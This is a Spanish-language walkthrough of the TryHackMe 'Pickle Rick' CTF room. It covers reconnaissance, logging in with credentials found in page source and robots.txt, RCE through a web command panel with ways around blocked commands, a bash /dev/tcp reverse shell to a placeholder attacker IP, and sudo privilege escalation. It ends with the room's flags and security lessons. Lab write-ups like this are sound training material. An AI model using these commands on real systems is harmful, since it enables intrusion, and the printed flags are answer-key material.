# 🥒 Pickle Rick — TryHackMe Writeup

> **Plataforma:** TryHackMe  
> **Sala:** [Pickle Rick](https://tryhackme.com/room/picklerick)  
> **Dificultad:** 🟢 Fácil  
> **Categoría:** Web Exploitation / Linux Privilege Escalation  
> **Objetivo:** Encontrar 3 ingredientes ocultos en el servidor para que Rick recupere su forma humana

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de puertos (Nmap)](#escaneo-de-puertos-nmap)
  - [Enumeración web](#enumeración-web)
  - [Fuzzing de directorios (Gobuster)](#fuzzing-de-directorios-gobuster)
- [Explotación](#explotación)
  - [Acceso al panel de administración](#acceso-al-panel-de-administración)
  - [Ejecución remota de comandos (RCE)](#ejecución-remota-de-comandos-rce)
  - [Reverse Shell](#reverse-shell)
- [Escalada de Privilegios](#escalada-de-privilegios)
- [Flags](#flags)
- [Lecciones Aprendidas](#lecciones-aprendidas)

---

## Descripción

**Pickle Rick** es una sala CTF temática de la serie *Rick and Morty*. Rick se ha convertido accidentalmente en un pepinillo y necesita que localicemos 3 ingredientes secretos escondidos en un servidor web vulnerable para preparar la poción que le devuelva su forma humana.

La máquina pone a prueba habilidades de:
- Enumeración web
- Explotación de un panel de comandos expuesto
- Escalada de privilegios mediante `sudo`

---

## Reconocimiento

### Escaneo de puertos (Nmap)

```bash
nmap -sV -sC -oN nmap_scan.txt <MACHINE_IP>
```

**Resultado relevante:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

Tenemos dos servicios expuestos: **SSH (22)** y un servidor web **HTTP (80)**. Empezamos por el web.

---

### Enumeración web

Accedemos a `http://<MACHINE_IP>` y encontramos la página principal con el mensaje de Rick.

Lo primero es revisar el código fuente (`Ctrl+U` o `view-source:`):

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

> 💡 **Hallazgo #1:** Nombre de usuario encontrado en el código fuente: `R1ckRul3s`

A continuación revisamos el archivo `robots.txt`:

```
http://<MACHINE_IP>/robots.txt
```

Contenido:

```
Wubbalubbadubdub
```

> 💡 **Hallazgo #2:** Posible contraseña: `Wubbalubbadubdub`

---

### Fuzzing de directorios (Gobuster)

```bash
gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Resultado relevante:**

```
/login.php          (Status: 200)
/portal.php         (Status: 302)
/assets             (Status: 301)
/robots.txt         (Status: 200)
/index.html         (Status: 200)
```

> 💡 Encontramos `/login.php` — un panel de login que no estaba vinculado desde la página principal.

---

## Explotación

### Acceso al panel de administración

Navegamos a `http://<MACHINE_IP>/login.php` e introducimos las credenciales encontradas:

| Campo | Valor |
|-------|-------|
| **Usuario** | `R1ckRul3s` |
| **Contraseña** | `Wubbalubbadubdub` |

✅ Acceso concedido. Somos redirigidos a `/portal.php`.

---

### Ejecución remota de comandos (RCE)

El portal contiene un campo que permite ejecutar comandos del sistema directamente. Verificamos que tenemos RCE:

```bash
whoami
```

Resultado: `www-data`

Comprobamos también qué comandos están restringidos. Varios comandos como `cat` están bloqueados, pero podemos usar alternativas:

```bash
# En lugar de cat, usamos:
less <archivo>
# o también:
strings <archivo>
# o incluso:
grep "" <archivo>
```

Listamos el directorio actual:

```bash
ls -la
```

```
Sup3rS3cretPickl3Ingred.txt
clue.txt
denied.php
...
```

---

### Ingrediente 1 — `/var/www/html/`

```bash
less Sup3rS3cretPickl3Ingred.txt
```

> 🧪 **Flag 1:** `mr. meeseek hair`

---

### Ingrediente 2 — Directorio home de Rick

Exploramos los directorios home:

```bash
ls /home/rick
```

```
second ingredients
```

```bash
less "/home/rick/second ingredients"
```

> 🧪 **Flag 2:** `1 jerry tear`

---

### Reverse Shell

Para mayor comodidad obtenemos una shell interactiva. En el panel de comandos ejecutamos:

```bash
bash -i >& /dev/tcp/<TU_IP>/4444 0>&1
```

En nuestra máquina atacante abrimos el listener previamente:

```bash
nc -lvnp 4444
```

✅ Obtenemos conexión como `www-data`.

---

## Escalada de Privilegios

Comprobamos los privilegios `sudo` del usuario actual:

```bash
sudo -l
```

Resultado:

```
User www-data may run the following commands on ip-<MACHINE_IP>:
    (ALL) NOPASSWD: ALL
```

> ⚠️ El usuario `www-data` puede ejecutar **cualquier comando como root sin contraseña**. Escalar es trivial.

```bash
sudo bash
```

Somos `root`. Buscamos el tercer ingrediente:

```bash
ls /root
```

```
3rd.txt
snap
```

```bash
cat /root/3rd.txt
```

> 🧪 **Flag 3:** `fleeb juice`

---

## Flags

| # | Ingrediente | Ubicación |
|---|-------------|-----------|
| 1 | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` |
| 2 | `1 jerry tear` | `/home/rick/second ingredients` |
| 3 | `fleeb juice` | `/root/3rd.txt` |

---

## Lecciones Aprendidas

- **Nunca dejar credenciales en comentarios HTML.** El código fuente es público y lo primero que revisa un atacante.
- **`robots.txt` no es seguridad.** Ocultar una contraseña ahí es equivalente a no ocultarla.
- **Los paneles de comandos web son extremadamente peligrosos.** Si es necesario tenerlos, deben estar correctamente protegidos con autenticación robusta y limitación de comandos.
- **Revisar siempre los permisos `sudo`.** `NOPASSWD: ALL` otorga a cualquier proceso que comprometa ese usuario control total sobre el sistema.

---

## Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Escaneo de puertos y servicios |
| `gobuster` | Fuzzing de directorios web |
| `netcat (nc)` | Listener para reverse shell |
| Browser DevTools | Revisión de código fuente |

---

*Writeup realizado con fines educativos. Todos los ataques fueron ejecutados en un entorno controlado y autorizado por TryHackMe.*
